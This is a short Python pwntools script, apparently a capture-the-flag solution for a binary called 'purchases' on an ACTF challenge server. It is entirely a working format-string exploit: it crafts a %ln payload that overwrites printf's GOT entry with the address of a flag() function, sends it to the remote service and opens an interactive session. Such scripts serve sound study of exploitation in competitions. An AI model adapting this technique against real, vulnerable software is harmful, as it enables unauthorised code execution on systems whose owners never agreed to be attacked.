from pwn import *
elf = ELF('./purchases')
printf_address = elf.symbols['got.printf']
flag = elf.symbols['flag']			# Get the function flag() address
flag = str(flag)					# Convert to string
payload = '%' + flag + 'x%10$ln'	# Using ln because of 8 bytes address
# p = elf.process()
p = remote('shell.actf.co',19011)
p.recvuntil("purchase? ")
p.sendline(payload.rjust(16)+p64(printf_address)[:3])
p.interactive()